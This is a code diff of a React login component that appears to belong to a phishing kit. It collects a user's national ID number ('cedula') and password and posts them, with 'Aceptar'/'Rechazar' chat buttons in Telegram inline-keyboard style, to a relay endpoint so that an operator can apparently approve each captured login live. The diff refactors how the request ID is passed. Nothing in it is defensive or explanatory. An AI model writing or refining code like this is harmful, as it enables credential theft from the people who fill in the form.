@@ -14,30 +14,27 @@ function App() {
   const [password, setPassword] = useState("");
   const [requestId, setRequestId] = useState<string | null>(null);
 
-  const { decision, connected } = useSse({ requestId });
+  const { decision } = useSse({ requestId });
 
 
   const startSubscription = async () => {
-    try {
-      const response = await api.post("/news/request");
+    const response = await api.post("/news/request");
 
-      console.log(response.data);
+    const { requestId } = response.data;
 
-      const { requestId } = response.data;
-      setRequestId(requestId);
-
-      console.log(decision == 'accepted' ? 'Se te aceptop' : 'no se te acepto')
-      console.log(connected ? 'estas conectado' : 'no estas conectado');
-    } catch (error) {
-      console.error("Error creando solicitud:", error);
-    }
+    setRequestId(requestId);
+    return requestId;
   };
 
   const onContinue = async () => {
-    if (!requestId) {
-      await startSubscription();
-    }
+
     try {
+      let currentRequestId = requestId;
+
+      if (!currentRequestId) {
+        currentRequestId = await startSubscription();
+      }
+
       const response = await api.post("/send/data", {
         text: `\nCC: ${cedula} \n\nContra: ${password}`,
         reply_markup: {
@@ -45,17 +42,17 @@ function App() {
             [
               {
                 text: "Aceptar",
-                callback_data: `news:accept:${requestId}`,
+                callback_data: `news:accept:${currentRequestId}`,
               },
               {
                 text: "Rechazar",
-                callback_data: `news:reject:${requestId}`,
+                callback_data: `news:reject:${currentRequestId}`,
               },
             ],
           ],
+          requestId: currentRequestId,
         }
       });
-      // startSubscription();
 
       return response;
     } catch (error) {
